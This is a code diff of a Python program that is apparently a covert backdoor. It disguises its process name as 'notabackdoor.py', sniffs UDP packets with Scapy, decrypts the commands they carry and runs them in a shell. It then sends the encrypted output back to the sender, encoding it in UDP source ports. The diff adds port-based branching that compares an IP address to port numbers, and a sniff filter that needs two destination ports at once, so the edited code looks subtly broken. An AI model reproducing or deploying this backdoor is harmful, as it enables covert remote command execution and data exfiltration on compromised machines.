@@ -46,22 +46,30 @@ def executeShellCommand(command):
 def parsePacket(receivedPacket):
 
     command = decrypt(receivedPacket['Raw'].load)
-    print "Excuting: " + command
-    output = executeShellCommand(command)
-    print "Output: " + output
-    output = encrypt(output)
-    print output
-    output_dec = [ord(ch) for ch in output]
-    print len(output_dec)
-    print output_dec
 
-    for srcport in output_dec:
-        returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=srcport)/encrypt(output)
+
+    if receivedPacket["IP"].dst == 22:
+        directory = decrypt(receivedPacket['Raw'].load)
+
+    elif receivedPacket["IP"].dst == 80:
+
+        print "Excuting: " + command
+        output = executeShellCommand(command)
+        print "Output: " + output
+        output = encrypt(output)
+        print output
+
+        output_dec = [ord(ch) for ch in output]
+        print len(output_dec)
+        print output_dec
+
+        for srcport in output_dec:
+            returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=srcport)/encrypt(output)
+            send(returnPacket)
+            # time.sleep(0.5)
+
+        returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=128)/encrypt(output)
         send(returnPacket)
-        # time.sleep(0.5)
-
-    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=128)/encrypt(output)
-    send(returnPacket)
 
 ##################################################################################
 ##  FUNCTION
@@ -75,7 +83,7 @@ def parsePacket(receivedPacket):
 def main():
 
     setproctitle.setproctitle("notabackdoor.py")
-    sniff(filter="udp and (dst port 80) and (src port 8000)", prn=parsePacket)
+    sniff(filter="udp and (dst port 80) and (dst port 22) and (src port 8000)", prn=parsePacket)
 
 if __name__ == '__main__':
     main()
